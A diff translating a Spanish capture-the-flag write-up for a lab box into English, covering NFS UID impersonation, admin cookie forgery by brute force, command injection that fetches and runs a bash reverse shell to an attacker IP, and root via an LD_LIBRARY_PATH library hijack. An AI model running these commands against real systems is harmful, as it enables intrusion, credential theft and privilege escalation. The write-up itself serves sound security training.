@@ -46,7 +46,7 @@ Export list for 10.130.140.158:
 /mnt/share *
 ```
 
-El share está abierto a cualquier host (`*`). Al montar e intentar listar el contenido, el acceso es denegado:
+The share is open to any host (`*`). When mounting and trying to list the contents, access is denied:
 
 ```bash
 mkdir /tmp/nfs_mount
@@ -55,13 +55,13 @@ sudo ls -la /tmp/nfs_mount
 # ls: cannot open directory '/tmp/nfs_mount': Permission denied
 ```
 
-Inspeccionando los permisos del directorio montado:
+Inspecting the permissions of the mounted directory:
 
 ```
 drwx------  2 1003 1003 4.0K Aug  8  2023 nfs_mount
 ```
 
-El directorio pertenece al UID `1003`, que no existe localmente. NFS autentica por UID, por lo que basta con crear un usuario local con ese mismo UID para obtener acceso.
+The directory belongs to UID `1003`, which doesn't exist locally. NFS authenticates by UID, so simply creating a local user with that same UID grants access.
 
 **NFS UID Hijack:**
 
@@ -79,7 +79,7 @@ ftp creds :
 ftpuser:W3stV1rg1n14M0un741nM4m4
 ```
 
-Credenciales FTP obtenidas.
+FTP credentials obtained.
 
 ---
 
@@ -109,26 +109,26 @@ NOTE To rick : good job on limiting login attempts, it works like a charm, this 
 prevent any future brute forcing.
 ```
 
-Extraemos dos datos clave: usuario **admin** y una lista de passwords en `.passwords_list.txt`.
+We extract two key pieces of information: user **admin** and a list of passwords in `.passwords_list.txt`.
 
 ---
 
-### Web — Análisis de la cookie
+### Web — Cookie Analysis
 
-Al crear una cuenta e iniciar sesión, la cookie `PHPSESSID` está codificada en base64:
+When creating an account and logging in, the `PHPSESSID` cookie is base64 encoded:
 
 ```bash
 echo "bmlrOmUxMGFkYzM5NDliYTU5YWJiZTU2ZTA1N2YyMGY4ODNl" | base64 -d
 # nik:e10adc3949ba59abbe56e057f20f883e
 ```
 
-La estructura es `usuario:md5(password)` — lo que permite **falsificar sesiones** de cualquier usuario conociendo o crackeando su hash.
+The structure is `username:md5(password)` — which allows **forging sessions** for any user by knowing or cracking their hash.
 
 ---
 
-### Web — Cookie Hijack de admin
+### Web — Admin Cookie Hijack
 
-Con la lista de passwords del FTP, hasheamos cada una en MD5, construimos la cookie como `admin:hash` en base64 y la probamos contra `/administration.php`:
+With the password list from FTP, we MD5 hash each one, construct the cookie as `admin:hash` in base64, and test it against `/administration.php`:
 
 ```bash
 #!/bin/bash
@@ -140,10 +140,10 @@ while IFS= read -r pass; do
     cookie=$(echo -n "admin:$hash" | base64)
     result=$(curl -s -b "PHPSESSID=$cookie" "http://$TARGET/administration.php")
 
-    echo "[-] Probando: $pass"
+    echo "[-] Testing: $pass"
 
     if echo "$result" | grep -qi "Administration Page"; then
-        echo "[+] Password encontrada: $pass"
+        echo "[+] Password found: $pass"
         echo "[+] Cookie: PHPSESSID=$cookie"
         exit 0
     fi
@@ -153,7 +153,7 @@ done < "$PASSFILE"
 
 **Output:**
 ```
-[+] Password encontrada: <password>
+[+] Password found: <password>
 [+] Cookie: PHPSESSID=<cookie>
 ```
 
@@ -161,39 +161,39 @@ done < "$PASSFILE"
 
 ## Foothold — Command Injection
 
-El panel de administración tiene un campo para comprobar el estado de servicios. El filtro bloquea `;` y otros separadores pero no `&&`.
+The administration panel has a field to check service status. The filter blocks `;` and other separators but not `&&`.
 
-Subimos una reverse shell al servidor víctima:
+We upload a reverse shell to the victim server:
 
 ```bash
-# En kali
+# On kali
 echo 'bash -i >& /dev/tcp/192.168.160.214/4242 0>&1' > shell.sh
 python3 -m http.server 8080
 ```
 
-Desde el campo del servicio descargamos la shell a `/tmp`:
+From the service field we download the shell to `/tmp`:
 
 ```
 ssh&&curl http://192.168.160.214:8080/shell.sh -o /tmp/shell.sh
 ```
 
-Con el listener activo ejecutamos:
+With the listener active we execute:
 
 ```bash
 nc -lvnp 4242
 ```
 
-En el campo del servicio:
+In the service field:
 
 ```
 &&bash /tmp/shell.sh
 ```
 
-**Shell obtenida como `www-data`.**
+**Shell obtained as `www-data`.**
 
 ---
 
-### Estabilizar shell
+### Stabilize shell
 
 
 ```bash
@@ -206,7 +206,7 @@ reset
 
 ---
 
-### Enumeración post-explotación
+### Post-Exploitation Enumeration
 
 ```bash
 cat /var/www/html/config.php
@@ -220,7 +220,7 @@ $password = "N3v3rG0nn4G1v3Y0uUp";
 $dbname = "hijack";
 ```
 
-Credenciales de rick en el config de la web. Probamos por SSH:
+Rick's credentials found in the web config. We try them via SSH:
 
 ```bash
 ssh rick@$TARGET
@@ -241,7 +241,7 @@ User rick may run the following commands on Hijack:
 
 ## Privesc — LD_LIBRARY_PATH Hijack
 
-`sudo` conserva `LD_LIBRARY_PATH` gracias a `env_keep`. Comprobamos las librerías que carga apache2:
+`sudo` preserves `LD_LIBRARY_PATH` thanks to `env_keep`. We check the libraries loaded by apache2:
 
 ```bash
 ldd /usr/sbin/apache2
@@ -252,7 +252,7 @@ ldd /usr/sbin/apache2
 libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1
 ```
 
-Creamos una shared library maliciosa con el mismo nombre que una de las librerías que carga apache2:
+We create a malicious shared library with the same name as one of the libraries loaded by apache2:
 
 ```bash
 cat > /tmp/evil.c << EOF
@@ -269,7 +269,7 @@ EOF
 gcc -shared -fPIC -o /tmp/libcrypt.so.1 /tmp/evil.c
 ```
 
-Al ejecutar apache2 con sudo apuntando `LD_LIBRARY_PATH` a `/tmp`, carga nuestra librería en lugar de la real y ejecuta el constructor:
+By running apache2 with sudo pointing `LD_LIBRARY_PATH` to `/tmp`, it loads our library instead of the real one and executes the constructor:
 
 ```bash
 sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
@@ -282,7 +282,7 @@ root
 cat /root/root.txt
 ```
 
-**Root obtenido.**
+**Root obtained.**
 ---
 
 ## Related Notes
